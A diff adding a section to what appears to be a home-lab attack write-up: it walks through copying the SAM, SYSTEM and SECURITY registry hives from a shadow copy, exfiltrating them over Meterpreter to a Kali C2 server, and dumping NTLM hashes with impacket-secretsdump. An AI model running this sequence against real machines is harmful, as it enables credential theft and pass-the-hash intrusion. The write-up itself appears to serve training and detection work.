@@ -423,7 +423,65 @@ vssadmin list shadows
  
 The `ReturnValue: 0` confirms successful creation. The `vssadmin list shadows` output shows the shadow copy set ID, creation timestamp, originating machine (`DESKTOP-H53BPAA`), and type (`ClientAccessible`), confirming unrestricted SYSTEM-level access on the target host.
 
+<img width="1013" height="193" alt="image" src="https://github.com/user-attachments/assets/7c344600-ed89-41a5-bd50-ed4d36309c48" />
 
+<img width="754" height="391" alt="image" src="https://github.com/user-attachments/assets/b6ed215a-b333-4725-9b86-9105f4f6e250" />
+
+<img width="653" height="95" alt="image" src="https://github.com/user-attachments/assets/44f5eba8-a9ee-441a-8ddd-fb645277eaf4" />
+
+The most impactful files from the Volume Shadow Copy were exfiltrated to the Kali C2 server to demonstrate the real-world impact of SYSTEM-level access. The SAM, SYSTEM, and SECURITY registry hives are locked by Windows at runtime and cannot be read by any process — including administrators — while the OS is running. The shadow copy bypasses this restriction entirely, providing offline access to credential material that would otherwise be inaccessible.
+ 
+Copy Credential Hives from the Shadow Copy
+ 
+The three files were copied directly from the shadow copy device path to the staging directory:
+ 
+```cmd
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\temp\SAM
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\SYSTEM
+copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" C:\temp\SECURITY
+```
+ 
+| File | Purpose |
+|:---|:---|
+| `SAM` | Security Account Manager — contains hashed local user credentials |
+| `SYSTEM` | Contains the boot key required to decrypt the SAM database |
+| `SECURITY` | Contains cached domain credentials and LSA secrets |
+ 
+ 
+Download to Kali via Meterpreter
+ 
+From the SYSTEM Meterpreter session:
+ 
+```bash
+exit
+download C:\\temp\\SAM /home/kali/loot/
+download C:\\temp\\SYSTEM /home/kali/loot/
+download C:\\temp\\SECURITY /home/kali/loot/
+```
+ 
+*[SCREENSHOT: Meterpreter download output showing all three files transferred]*
+ 
+Verify Files on Kali C2
+ 
+```bash
+ls -lh /home/kali/loot/SAM /home/kali/loot/SYSTEM /home/kali/loot/SECURITY
+```
+ 
+*[SCREENSHOT: `ls` output confirming all three files present on Kali with non-zero file sizes]*
+ 
+Dump Credential Hashes
+ 
+With all three hives on the C2 server, offline credential extraction was performed using Impacket:
+ 
+```bash
+impacket-secretsdump -sam /home/kali/loot/SAM -system /home/kali/loot/SYSTEM -security /home/kali/loot/SECURITY LOCAL
+```
+ 
+*[SCREENSHOT: secretsdump output showing extracted NTLM hashes for local accounts]*
+ 
+Impact
+ 
+The SAM database is encrypted with a boot key derived from the SYSTEM hive. Having these files allows complete offline decryption and extraction of all local account NTLM hashes without touching the live system or triggering any endpoint detection. These hashes can be used directly in pass-the-hash attacks or cracked offline to recover plaintext passwords. This demonstrates that SYSTEM-level access combined with shadow copy access results in full credential compromise of the host.
 
 ### Phase 5: Log Analysis
 **Sysmon Event ID 1 Findings:**
